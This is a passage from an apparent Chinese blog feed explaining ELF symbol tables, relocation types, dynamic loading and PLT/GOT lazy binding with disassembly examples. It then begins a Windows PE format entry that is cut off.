–S命令查看可执行文件的输出，可以看到一部分节被标记为了A（ALLOC）、WA（WRITE/ALLOC）或者AX（ALLOC/EXEC）。.dynsym是被标记了ALLOC的，而.symtab则没有标记。</p><p>ALLOC表示有该标记的节会在运行时分配并装载进入内存，而.symtab不是在运行时必需的，因此不会被装载到内存中。.dynsym保存的符号只能在运行时被解析，因此是运行时动态链接器所需要的唯一符号。.dynsym符号表对于动态链接可执行文件的执行来说是必需的，而.symtab符号表只是用来进行调试和链接的，有时候为了节省空间，会将.symtab符号表从生产二进制文件中删掉。</p><p>下面介绍ELF文件符号项结构(32位为例):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line">Elf32_Word    st_name;        <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">Elf32_Addr    st_value;       <span class="comment">/* Symbol value */</span></span><br><span class="line">Elf32_Word    st_size;        <span class="comment">/* Symbol size */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;        <span class="comment">/* Symbol type and binding */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;       <span class="comment">/* Symbol visibility */</span></span><br><span class="line">Elf32_Section st_shndx;       <span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th>字段</th><th>说明</th></tr></thead><tbody><tr><td>st_name</td><td>包含目标文件符号字符串表的索引，其中包含符号名的字符串表示。如果该值非 0，则它表示了给出符号名的字符串表索引，否则符号表项没有名称。注：外部  C  符号在  C  语言和目标文件的符号表中具有相同的名称。</td></tr><tr><td>st_value</td><td>此成员给出相关联的符号的取值。依赖于具体的上下文，它可能是一个绝对值、一个地址等等。</td></tr><tr><td>st_size</td><td>很多符号具有相关的尺寸大小。例如一个数据对象的大小是对象中包含的字节数。如果符号没有大小或者大小未知，则此成员为 0。</td></tr><tr><td>st_info</td><td>此成员给出符号的类型和绑定属性。下面给出若干取值和含义的绑定关系。</td></tr><tr><td>st_other</td><td>该成员当前包含 0，其含义没有定义。</td></tr><tr><td>st_shndx</td><td>每个符号表项都以和其他节区间的关系的方式给出定义。此成员给出相关的节区头部表索引。某些索引具有特殊含义</td></tr></tbody></table></div><p>关于st_info的详细说明：</p><p>t_info指定符号类型及绑定属性。操纵方式如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_BIND(i) ((i)&gt;&gt;4)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_TYPE(i) ((i)&amp;0xf) </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_INFO(b, t) (((b)&lt;&lt;4) + ((t)&amp;0xf))</span></span><br></pre></td></tr></table></figure><p>st_info的低四位表示符号绑定</p><p>可以查阅ELF手册来查看完整的类型以属性列表。符号类型以STT开头，符号绑定以STB开头，下面对几种常见的符号类型和符号绑定进行介绍。</p><p>1．<strong>符号类型</strong></p><p>下面是几种符号类型。</p><ul><li><p>STT_NOTYPE：符号类型未定义。</p></li><li><p>STT_FUNC：表示该符号与函数或者其他可执行代码关联。</p></li><li><p>STT_OBJECT：表示该符号与数据目标文件关联</p></li></ul><p>2.<strong>符号绑定</strong>:用于确定链接可见性和行为</p><div class="table-container"><table><thead><tr><th>名称</th><th>取值</th><th>说明</th></tr></thead><tbody><tr><td>STB_LOCAL</td><td>0</td><td>局部符号在包含该符号定义的目标文件以外不可见。相同名称的局部符号可以存在于多个文件中，互不影响。</td></tr><tr><td>STB_GLOBAL</td><td>1</td><td>全局符号对所有将组合的目标文件都是可见的。一个文件中对某个全局符号的定义将满足另一个文件对相同全局符号的未定义引用。</td></tr><tr><td>STB_WEAK</td><td>2</td><td>弱符号与全局符号类似，不过他们的定义优先级比较低。</td></tr><tr><td>STB_LOPROC</td><td>13</td><td>处于这个范围的取值是保留给处理器专用语义的。</td></tr><tr><td>STB_HIPROC</td><td>15</td><td>处于这个范围的取值是保留给处理器专用语义的。</td></tr></tbody></table></div><p>全局符号与弱符号之间的区别主要有两点：</p><p>(1).当链接编辑器组合若干可重定位的目标文件时，不允许对同名的STB_GLOBAL 符号给出多个定义。 另一方面如果一个已定义的全局符号已经存在，出现一个同名的弱符号并不会产生错误。链接编辑器尽关心全局符号，忽略弱符号。 类似地，如果一个公共符号（符号的 st_shndx 中包含 SHN_COMMON），那么具有相同名称的弱符号出现也不会导致错误。链接编辑器会采纳公共定义，而忽略弱定义。 </p><p>(2).当链接编辑器搜索归档库（archive libraries）时，会提取那些包含未定义全局符号的档案成员。成员的定义可以是全局符号，也可以是弱符号。连接编辑器不会提取档案成员来满足未定义的弱符号。 未能解析的弱符号取值为0。</p><p>在每个符号表中，所有具有  STB_LOCAL绑定的符号都优先于弱符号和全局符号。符号表节区中的  sh_info  头部成员包含第一个非局部符号的符号表索引。</p><p>🙂有点不太懂，涉及这部分的内容需要回头在看</p><p><strong>重定位</strong></p><p>重定位就是将符号定义和符号引用进行连接的过程。可重定位文件需要包含描述如何修改节内容的相关信息，从而使得可执行文件和共享目标文件能够保存进程的程序镜像所需的正确信息。重定位条目就是我们上面说的相关信息。</p><p>我们首先介绍了符号和节相关的内容，因为接下来要讨论的重定位过程需要依赖符号和节。在重定位文件中，重定位记录保存了如何对给定的符号对应代码进行补充的相关信息。重定位实际上是一种给二进制文件打补丁的机制，如果使用了动态链接器，可以使用重定位在内存中打热补丁（hotfix）。用于创建可执行文件和共享库的链接程序/bin/ld，需要某种类型的元数据来描述如何对特定的指令进行修改。这种元数据就存放在前面提到的重定位记录中。</p><p>举个栗子:</p><p>假设要将两个目标文件链接到一起产生一个可执行文件。obj1.o文件中存放了调用函数foo()的代码，而函数foo()是存放在目标文件obj2.o中的。链接程序会对obj1.o和obj2.o中的重定位记录进行分析并将这两个文件链接在一起产生一个可以独立运行的可执行程序。符号引用会被解析成符号定义，这是什么意思呢？目标文件是可重定位的代码，也就是说，目标文件中的代码会被重定位到可执行文件的段中一个给定的地址。在进行重定位之前，无法确定obj1.o或者obj2.o中的符号和代码在内存中的位置，因此无法进行引用。只能在链接器确定了可执行文件的段中存放的指令或者符号的位置之后才能够进行修改。</p><p><strong>重定位表</strong></p><p>下面是重定位表项的数据结构（32位为例）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span> </span><br><span class="line">Elf32_Addr r_offset; </span><br><span class="line">Elf32_Word r_info; </span><br><span class="line">&#125; Elf32_Rel; </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span> </span><br><span class="line">Elf32_Addr r_offset; </span><br><span class="line">Elf32_Word r_info; </span><br><span class="line">Elf32_Word r_addend; </span><br><span class="line">&#125; Elf32_Rela</span><br></pre></td></tr></table></figure><p><strong>重定位表字段说明</strong></p><div class="table-container"><table><thead><tr><th>成员</th><th>说明</th></tr></thead><tbody><tr><td>r_offset</td><td>此成员给出了重定位动作所适用的位置。对于一个可重定位文件而言，此值是从节区头部开始到将被重定位影响的存储单位之间的字节偏移。对于可执行文件或者共享目标文件而言，其取值是被重定位影响到的存储单元的虚拟地址。</td></tr><tr><td>r_info</td><td>此成员给出要进行重定位的符号表索引，以及将实施的重定位类型。例如一个调用指令的重定位项将包含被调用函数的符号表索引。如果索引是  STN_UNDEF，那么重定位使用  0  作为“符号值”。重定位类型是和处理器相关的。当程序代码引用一个重定位项的重定位类型或者符号表索引，则表示对表项的  r_info  成员应用  ELF32_R_TYPE  或者  ELF32_R_SYM  的结果。</td></tr><tr><td>r_addend</td><td>此成员给出一个常量补齐，用来计算将被填充到可重定位字段的数值</td></tr></tbody></table></div><p>重定位节区会引用两个其它节区：符号表、要修改的节区。节区头部的sh_info和sh_link成员给出这些关系。不同目标文件的重定位表项对r_offset成员具有略微不同的解释。</p><p> (1).在可重定位文件中，r_offset中包含节区偏移。就是说重定位节区自身描述了如何修改文件中的其他节区；重定位偏移 指定了被修改节区中的一个存储单元。 </p><p>(2).在可执行文件和共享的目标文件中，r_offset中包含一个虚拟地址。为了使得这些文件的重定位表项对动态链接器更为有用，节区偏移（针对文件的解释）让位于虚地址（针对内存的解释）。 </p><p>尽管对  r_offset  的解释会有少许不同，重定位类型的含义始终不变。</p><p><strong>重定位类型</strong></p><p>重定位表项描述如何修改后面的指令和数据字段。一般，共享目标文件在创建时，其基本虚拟地址是0，不过执行地址将随着动态加载而发生变化。</p><p>重定位的过程按照如下标记：</p><ul><li><p>A 用来计算可重定位字段的取值的补齐</p></li><li><p>B 共享目标在执行过程中，重定位项的符号的地址所处的位置 —全局偏移表的索引</p></li><li><p>GOT 全局偏移表(GOT)的地址</p></li><li><p>L 某个符号的过程链接表项的位置（节区偏移地址）。过程连接表项把函数调用重定位到正确的目标位置。链接编辑器构造初始的过程链接表，动态链接器在执行过程中修改这些项目。</p></li><li><p>P 存储单位被重定位（用r_offset计算）到的位置（节区偏移或者地址）</p></li><li><p>S 其索引位于重定位表项中的符号取值</p></li></ul><p>重定位项的  r_offset  取值给定受影响的存储单位的第一个字节的偏移或者虚拟地址。重定位类型给出那些位需要修改以及如何计算它们的取值。</p><p>SYSTEM  V仅使用Elf32_Rel重定位表项，在被重定位的字段中包含补齐量。补齐量和计算结果始终采用相同的字节顺序。</p><p>X86体系结构下常见重定位类型：</p><div class="table-container"><table><thead><tr><th>名称</th><th>数值</th><th>字段</th><th>计算</th><th>说明</th></tr></thead><tbody><tr><td>R_386_NONE</td><td>0</td><td>none</td><td>none</td><td></td></tr><tr><td>R_386_32</td><td>1</td><td>word32</td><td>S+A</td><td></td></tr><tr><td>R_386_PC32</td><td>2</td><td>word32</td><td>S+A-P</td><td></td></tr><tr><td>R_386_GOT32</td><td>3</td><td>word32</td><td>G+A-P</td><td>此重定位类型计算从全局偏移表基址到符号的全局偏移表项之间的距离。它会通知连接编辑器构造一个全局偏移表。</td></tr><tr><td>R_386_PLT32</td><td>4</td><td>word32</td><td>L+A-P</td><td>此重定位类型计算符号的过程链接表项的地质，并通知链接编辑器构造一个过程链接表。</td></tr><tr><td>R_386_COPY</td><td>5</td><td>word32</td><td>none</td><td>链接编辑器创建这种重定位类型的目的是支持动态链接。其偏移量成员引用某个可写段中的某个位置。符号表索引规定符号应该既存在于当前目标文件中，也存在于某个共享目标中。在执行过程中，动态链接器把与共享目标的符号相关的数据复制到由偏移给出的位置。</td></tr><tr><td>R_386_GLOB_DAT</td><td>6</td><td>word32</td><td>S</td><td>此重定位类型用来把某个全局偏移表项设置为给定符号的地址。这种特殊的重定位类型允许确定符号与全局偏移表项之间的关系。</td></tr><tr><td>R_386_JMP_SLOT</td><td>7</td><td>word32</td><td>S</td><td>链接编辑器创建这种重定位类型主要是为了支持动态链接。其偏移地址成员给出过程链接表项的位置。动态链接器修改过程链接表项的内容，把控制传输给指定符号的地址。</td></tr><tr><td>R_386_RELATIVE</td><td>8</td><td>word32</td><td>B+A</td><td>链接编辑器创建这种重定位类型是为了支持动态链接。其偏移地址成员给出共享目标中的一个位置，在该位置包含了代表相对地址的一个数值。动态链接器通过把共享目标被加载到的虚地址和相对地址相加，计算对应的虚地址。这种类型的重定位项必须设置符号表索引为 0。</td></tr><tr><td>R_386_GOTOFF</td><td>9</td><td>word32</td><td>S+A-GOT</td><td>这种重定位类型会计算符号取值与全局偏移表地址间的差。并通知链接编辑器创建一个全局偏移表。</td></tr><tr><td>R_386_GOTPC</td><td>10</td><td>word32</td><td>GOT+A-P</td><td>此重定位类型与  R<em>386_PC32  类似，只不过它在计算时采用全局偏移表的地址。在此重定位项中引用的符号通常是_GLOBAL_OFFSET_TABLE</em>，这种类型也会暗示连接编辑器构造全局偏移表。</td></tr></tbody></table></div><h2 id="程序加载和动态链接"><a href="#程序加载和动态链接" class="headerlink" title="程序加载和动态链接"></a><strong>程序加载和动态链接</strong></h2><p>这部分内容将符号、重定位和节在ELF格式文件的同一个抽象层次上紧密联系起来。</p><p><strong>程序加载</strong></p><p>进程除非在执行过程中引用到相应的逻辑页面，否则不会请求真正的物理页面。进程通常会包含很多未引用的页面，因此，延迟物理读操作通常会避免这类费力不讨好的事情发生，从而提高系统性能。要想实际获得这种效率，可执行文件和共享目标文件必须具有这样的段：其文件偏移和虚拟地址对页面大小取模后余数相同</p><p>Demo:</p><p><img src="https://i.loli.net/2021/04/25/7l8BhFyo9Kg4AsW.png" alt="ELF11.jpg"></p><p>​                                                                    可执行文件布局示例</p><p>该可执行文件头部段示例如下：</p><p><img src="https://i.loli.net/2021/04/25/AxqStp6l3PrOELB.png" alt="Head_ph.jpg"></p><p>这个例子中，至多四个文件页面包含非纯粹的正文或数据</p><ul><li>第一个页面包含ELF头部、程序头部表以及其他信息</li><li>最后一个页面包含数据开始部分的一个副本</li><li>第一数据页面包含正文段的末尾部分</li><li>最后一个数据页面可能包含与运行进程无关的文件信息</li></ul><p>操作系统一般会对这些页面做两次映射，以保证每个段的内存访问许可是相同的。数据段的末尾需要对未初始化数据进行特殊处理，系统应该将这些初始化为0</p><p>可执行文件与共享目标文件之间的段加载之间有一点不同。可执行文件的段通常包含绝对代码，为了能够让进程正确执行，所使用的段必须是构造可执行文件时所使用的虚拟地址。因此系统会使用p_vaddr作为虚拟地址。</p><p> 另外，共享目标文件的段通常包含与位置无关的代码。这使得段的虚拟地址在不同的进程中不同，但不影响执行行为。尽管系统为每个进程选择独立的虚拟地址，仍能维持段的相对位置。因为位置独立的代码在段与段之间使用相对寻址，内存虚地址之间的差异必须与文件中虚拟地址之间的差异相匹配。 </p><p><strong>程序解释器</strong></p><p>可执行文件可以包含PT_INTERP程序头部元素。在exec() 期间，系统从PT_INTERP段中检索路径名，并从解释器文件的段创建初始的进程映像。也就是说，系统并不使用原来可执行文件的段映像，而是为解释器构造一个内存映像。接下来是解释器从系统接收控制，为应用程序提供执行环境。</p><p>解释器可以有两种方式接受控制：</p><ul><li>接受一个文件描述符，读取可执行文件并将其映射到内存中</li><li>根据可执行文件的格式，系统可能把可执行文件加载到内存中，而不是为解释器提供一个已经打开的文件描述符。</li></ul><p>共享目标文件被加载到内存中时，其地址可能在各个进程中呈现不同的取值。系统在  mmap  以及相关服务所使用的动态段区域创建共享目标文件的段。因此，共享目标解释器通常不会与原来的可执行文件的原始段地址发生冲突。</p><p>可执行文件被加载到内存中固定地址，系统使用来自其程序头部表的虚拟地址创建各个段。因此，可执行文件解释器的虚拟地址可能会与原来的可执行文件的虚拟地址发生冲突。解释器要负责解决这种冲突。</p><p><strong>动态加载程序</strong></p><p>在构造使用动态链接技术的可执行文件时，连接编辑器向可执行文件中添加一个类型为PT_INTERP的程序头部元素，告诉系统要把动态链接器激活，作为程序解释器。系统所提供的动态链接器的位置是和处理器相关的。</p><p>Exec() 和动态链接器合作，为程序创建进程映像，其中包括以下动作：</p><p>(1).将可执行文件的内存段添加到进程映像中； </p><p>(2).把共享目标内存段添加到进程映像中； </p><p>(3).为可执行文件和它的共享目标执行重定位操作； </p><p>(4).关闭用来读入可执行文件的文件描述符，如果动态链接程序收到过这样的文件描述符的话； </p><p>(5).将控制转交给程序，使得程序好像从 exec 直接得到控制。</p><p><strong>PLT&amp;GOT</strong></p><p>位置独立的代码一般不能包含绝对的虚拟地址。全局偏移表在私有数据中包含绝对地址，从而使得地址可用，并且不会影响位置独立性和程序代码的可共享性。程序使用位置独立的寻址引用其全局偏移表，并取得绝对值，从而把位置独立的引用重定向到绝对位置。</p><p>全局偏移表中最初包含其重定位项中要求的信息。在系统为可加载目标创建内存段以后，动态链接器要处理重定位项，其中有一些重定位项的类型是R_386_GLOB_DAT，是对全局偏移表的引用。动态链接器确定相关的符号取值，计算其绝对地质，并将相应的内存表格项目设置为正确的数值。尽管在链接编辑器构造一个目标文件时还无法知道绝对地质，动态链接器清楚所有内存段的地址，因而能够计算其中所包含的符号的绝对地址。</p><p>全局偏移表（GOT，）用来将位置独立的地址计算重定向到绝对位置，与此相似，过程链接表（PLT）能够把位置独立的函数调用重定向到绝对位置。链接编辑器物能解析从一个可执行文件/共享目标到另一个可执行文件/共享目标控制转移（例如函数调用）。因此，链接编辑器让程序把控制转移给过程链接表中的表项。在System V中，过程链接表位于共享正文中，不过它们使用位于私有的全局偏移表中的地址。</p><p>动态链接器能够确定目标处的绝对地址，并据此修改全局偏移表的内存映像。动态链接器因此能够对表项进行重定位，并且不会影响程序代码的位置独立性和可共享性。可执行文件和共享目标文件拥有各自独立的过程链接表。</p><p>绝对过程链接表：</p><p><img src="https://i.loli.net/2021/04/25/S9aIeY3A5mdQU7u.png" alt="plt_got.jpg"></p><p>位置独立的过程链接表：</p><p><img src="https://i.loli.net/2021/04/25/9upXsj6SrvyWcZ4.png" alt="plt_got1.jpg"></p><p>如图所示，过程链接表命令针对绝对代码（图  1）和位置独立的代码（图  2）使用不同的操作数寻址模式。尽管如此，它们对动态链接器的接口还是相同的。</p><p>动态链接器和程序“合作”，通过过程链接表和全局偏移表解析符号引用：</p><p>1.在第一次创建程序的内存映像时，动态链接器为全局偏移表的第二和第三项设置特殊值。 </p><p>2.如果过程链接表是位置独立的，全局偏移表必须位于 %bx 中，进程映像中的每个共享目标文件都有自己的过程链接表，控制向过程链接表项的传递仅发生在同一个目标文件中。因此，调用函数用负责在调用过程链接表项之前设置全局偏移表的基址寄存器。</p><p> 3.出于说明的目的，假定程序调用了 name1，name1 将控制传输给标号 .PLT1。 </p><p> 4.第一条指令跳转到 name1 的全局偏移表项的地址。最初，全局偏移表中包含后面的 pushl 指令的地址，而不是 name1 的真实地址。 </p><p> 5.接下来，程序将重定位偏移（offset）压栈。重定位偏移是一个 32 位非负数，是在重定位表中的字节偏移量。指定的重定位表项的类型为 R_386_JMP_SLOT，其偏移将给出在前面的 jmp 指令中使用的 GOT 表项。重定位项也包含一个符号表索引，借以告诉动态链接器被引用的符号是什么，在这里是 name1。 </p><p> 6.在将重定位偏移压栈后，程序会跳转到 .PLT0，也就是过程链接表的第一项。pushl 指令把第二个全局偏移表项（got_plus_4 或者 4(%ebx)）压入堆栈，因而为动态链接器提供了识别信息的机会。程序然后跳转到第三个 GOT 表项内保存的地址（got_plus_8 或者 8(%ebx)），后者将控制传递给动态链接器。 </p><p> 7.当动态链接器得到控制后，它恢复堆栈，查看指定的重定位项，寻找符号的值，将 name1 的“真实”地址存储于全局偏移表项中，并将控制传递给期望的目的地。 </p><p>8.过程链接表项的后续执行将把控制直接传递给 name1，不会再次调用动态链接器。就是说 .PLT1 处的 jmp 将控制传递给 name1，而不会执行后面的 pushl 指令。</p><p>环境变量LD_BIND_NOW可以更改动态链接行为。如果其取值非空，动态链接器会在控制传递给程序之前，对过程链接表项进行计算。就是说动态链接器会在进程初始化的过程中处理类型为R_386_JMP_SLOT的重定位项。否则，动态链接器会对过程链接表实行懒惰计算，延迟符号解析和重定位，直到某个表项的第一次执行。</p><p>延迟绑定通常会提供整体的应用性能，因为未使用的符号不会引入额外的动态链接开销。尽管如此，有些应用情形会使得懒惰绑定不太合适。首先，对共享目标函数的第一次引用花的时间会超出后续调用，因为动态链接器要截获调用以便解析符号。一些应用不能容忍这种不可预测性。第二，如果发生了错误，动态链接器无法解析某个符号，动态链接器会终止程序。在懒惰绑定下，这类事情可能会发生任意多次。某些应用也可能无法容忍这种不可预测性。通过关闭懒惰绑定，动态链接器会迫使所有错误都发生在进程初始化期间，而不是应用程序接收控制以后。</p><p>Demo:</p><p>来看一个编译好的32位ELF可执行文件对libc.so的函数fgets()进行调用的例子。32位可执行文件与GOT的关系比较容易观察，因为在32位文件中没有用到IP相对地址，IP相对地址是在64位可执行文件中使用的:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8048481:       e8 da fe ff ff          call   8048360&lt;fgets@plt&gt;  </span><br></pre></td></tr></table></figure><p>地址0x8048360对应函数fgets()的PLT条目。接下来观察可执行文件中地址为0x8048360的内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">08048360&lt;fgets@plt&gt;:                    &#x2F;* A jmp into the GOT *&#x2F; </span><br><span class="line"> 8048360:       ff 25 00 a0 04 08       jmp    *0x804a000 </span><br><span class="line"> 8048366:       68 00 00 00 00          push   $0x0 </span><br><span class="line"> 804836b:       e9 e0 ff ff ff          jmp    8048350 &lt;_init+0x34&gt; </span><br></pre></td></tr></table></figure><p>对函数fgets()的调用会指向地址0x8048360，即函数fgets()的PLT跳转表条目。从前面反编译代码的输出中可以看到，有一个间接跳转指向存放在0x804a000中的地址，这个地址就是GOT条目，存放着libc共享库中函数fgets()的实际地址。</p><p>然而，动态链接器采用默认的延迟链接方式时，不会在函数第一次调用时就对地址进行解析。延迟链接意味着动态链接器不会在程序加载时解析每一个函数，而是在调用时通过.plt和.got.plt节（分别对应各自的过程链接表和全局偏移表）来对函数进行解析。可以通过修改LD_BIND_NOW环境变量将链接方式修改为严格加载，以便在程序加载的同时进行动态链接。动态链接器之所以默认采用延迟链接的方式，是因为延迟链接能够提高装载时的性能。不过，有时候有些不可预知的链接错误可能在程序运行一段时间后才能够发现。我在过去几年里也就碰到过一次这种情况。值得注意的是，有些安全特性，如只读重定位，只能在严格链接的模式下使用，因为.plt.got节是只读的。在动态链接器完成对.plt.got的补充之后才能够进行只读重定位，因此必须使用严格链接。</p><p>设函数fgets()是第一次被调用，动态链接器需要对fgets()的地址进行解析，并把值存入fgets()的GOT条目中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">08049ff4 &lt;_GLOBAL_OFFSET_TABLE_&gt;:   </span><br><span class="line">8049ff4:       28 9f 04 08 00 00    sub    %bl,0x804(%edi)   </span><br><span class="line">8049ffa:       00 00                add    %al,(%eax)   </span><br><span class="line">8049ffc:       00 00                add    %al,(%eax)   </span><br><span class="line">8049ffe:       00 00                add    %al,(%eax)   </span><br><span class="line">804a000:       66 83 04 08 76       addw   $0x76,(%eax,%ecx,1)   </span><br><span class="line">804a005:       83 04 08 86          addl   $0xffffff86,(%eax,%ecx,1)   804a009:       83 04 08 96          addl   $0xffffff96,(%eax,%ecx,1)   804a00d:       83                   .byte 0x83  </span><br><span class="line">804a00e:       04 08                add    $0x8,%al  </span><br></pre></td></tr></table></figure><p>重点注意地址0x08048366，该地址存储在GOT的0x804a000中。在低字节序中，低位字节排放在内存的低地址端，因此看上去是66 83 04 08。由于链接器还未对函数fgets()进行解析，故该地址并不是函数的地址，而是指向函数fgets()的PLT条目。再来看一下函数fgets()的PLT条目：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">08048360 &lt;fgets@plt&gt;:  </span><br><span class="line"> 8048360:       ff 25 00 a0 04 08     jmp     *0x804a000   </span><br><span class="line"> 8048366:       68 00 00 00 00        push    $0x0   </span><br><span class="line"> 804836b:       e9 e0 ff ff ff        jmp     </span><br><span class="line"> 8048350 &lt;_init+0x34&gt;  </span><br></pre></td></tr></table></figure><p>因此，jmp *0x804a000 指令会跳转到地址0x804a000 中存放的0x8048366，即push $0x0指令。该push指令的作用是将fgets()的GOT条目入栈。fgets()的GOT条目偏移地址为0x0，对应的第一个GOT条目是为一个共享库符号值保留的，0x0实际上是第4个GOT条目，即GOT[3]。换句话说，共享库的地址并不是从GOT[0]开始的，而是从GOT[3]开始的，前3个条目是为其他用途保留的。</p><p>下面是GOT的3个偏移量。</p><ul><li><p>GOT[0]：存放了指向可执行文件动态段的地址，动态链接器利用该地址提取动态链接相关的信息。</p></li><li><p>GOT[1]：存放link_map结构的地址，动态链接器利用该地址来对符号进行解析。</p></li><li><p>GOT[2]：存放了指向动态链接器_dl_runtime_resolve()函数的地址，该函数用来解析共享库函数的实际符号地址。</p></li></ul><p>fgets()的PLT存根（stub）的最后一条指令是jmp 8048350。该地址指向可执行文件的第一个PLT条目，即P LT- 0。</p><p>我们的可执行文件的P LT- 0存放了下面的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">8048350:         ff 35 f8 9f 04 08      pushl   0x8049ff8   </span><br><span class="line">8048356:         ff 25 fc 9f 04 08      jmp     *0x8049ffc   </span><br><span class="line">804835c:         00 00                  add     %al,(%eax)  </span><br></pre></td></tr></table></figure><p>第一条pushl指令将GOT[1]的地址压入栈中，前面提到过，GOT[1]中存放了指向link_map结构的地址.</p><p>jmp *0x8049ffc指令间接跳转到第3个GOT条目，即GOT[2]，在GOT[2]中存放了动态链接器_dl_runtime_resolve()函数的地址，然后将控制权转给动态链接器，解析fgets()函数的地址。对函数fgets()进行解析后，后续所有对PLT条目fgets()的调用都会跳转到fgets()的代码本身，而不是重新指向PLT，再进行一遍延迟链接的过程。</p><p>1．调用fgets@PLT（即调用fgets函数）。</p><p>2．PLT代码做一次到GOT中地址的间接跳转。</p><p>3．GOT条目存放了指向PLT的地址，该地址存放在push指令中。</p><p>4．push $0x0指令将fgets() GOT条目的偏移量压栈。</p><p>5．最后的fgets() PLT指令是指向P LT- 0代码的jmp指令。</p><p>6．P LT- 0的第一条指令将GOT[1]的地址压栈，GOT[1]中存放了指向fgets()的link_map结构的偏移地址。</p><p>7．P LT- 0的第二条指令会跳转到GOT[2]存放的地址，该地址指向动态链接器的_dl_runtime_resolve函数，_dl_runtime_resolve函数会通过把fgets()函数的符号值加到.got.plt节对应的GOT条目中，来处理R_386_JUMP_SLOT重定位。</p><p>下一次调用fgets()函数时，PLT条目会直接跳转到函数本身，而不是再执行一遍重定位过程。</p><p>图示：</p><p>第一次动态链接该函数</p><p><img src="https://i.loli.net/2021/04/19/dZJSNBM4QE7P3vx.png" alt="01.png"></p><p>之后：</p><p><img src="https://i.loli.net/2021/04/19/wVAyNBdLTXqC3fv.png" alt="02.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;linux-ELF&quot;&gt;&lt;a href=&quot;#linux-ELF&quot; class=&quot;headerlink&quot; title=&quot;linux_ELF&quot;&gt;&lt;/a&gt;linux_ELF&lt;/h1&gt;&lt;p&gt;在&lt;a href=&quot;https://bupt3xplorer.github.io/2</summary>
      
    
    
    
    <category term="linux" scheme="http://example.com/categories/linux/"/>
    
    
    <category term="linux" scheme="http://example.com/tags/linux/"/>
    
    <category term="ELF文件" scheme="http://example.com/tags/ELF%E6%96%87%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>Windows_PE文件格式</title>
    <link href="http://example.com/2021/04/22/Windows_PE%E6%96%87%E4%BB%B6/"/>
    <id>http://example.com/2021/04/22/Windows_PE%E6%96%87%E4%BB%B6/</id>
    <published>2021-04-22T11:39:53.685Z</published>
    <updated>2021-04-22T17:08:15.083Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Windows-PE文件格式"><a href="#Windows-PE文件格式" class="headerlink" title="Windows_PE文件格式"></a>Windows_PE文件格式</h1><p>​    PE文件格式是理解Windows操作系统进程、内存、动态链接库加载的基础，本文结合逆向课所学和查询的资料简单做个总结。</p><h2 id="1-PE文件基本介绍"><a href="#1-PE文件基本介绍" class="headerlink" title="1.PE文件基本介绍"></a><strong>1.PE文件基本介绍</strong></h2><p>PE文件是Windows操作系统下使用的一种可执行文件，由COFF（UNIX平台下的通用对象文件格式）格式文件发展而来。32位成为PE32，64位称为PE+或PE32+。</p><h2 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a><strong>基本结构</strong></h2><p> 从DOS头到节区头是PE头部分，其下的节区合称为PE体。</p><ol><li><p><strong>DOS头</strong></p><p>主要为现代PE文件可以对早期的DOS文件进行良好兼容存在，其结构体为IMAGE_DOS_HEADER。</p><p>大小为64字节，其中2个重要的成员分别是：</p><ul><li>e_magic:DOS签名（4D5A，MZ）</li><li>e_lfanew：指示NT头的偏移（文件不同，值不同）</li></ul></li><li><p><strong>DOS存根</strong></p><p>stub，位于DOS头下方，可选，大小不固定，由代码与数据混合组成。</p></li><li><p><strong>NT头</strong></p><p>结构体为IMAGE_NT_HEADERS，大小为F8，由3个成员组成：</p><ul><li>签名结构体，值为50450000h（“PE”00）</li><li>文件头，表现文件大致属性，结构体为IMAGE_FILE_HEADER，重要成员有4个：<ul><li>Machine：每个CPU都拥有的唯一的Machine码，兼容32位Intel x86芯片的Machine码为14C；</li><li>NumberOfSections：指出文件中存在的节区数量；</li><li>SizeOfOptionalHeader：指出结构体IMAGE_OPTIONAL_HEADER32（32位系统）的长度</li><li>Characteristics：标识文件属性，文件是否是可运行形态、是否为DLL等，以bit 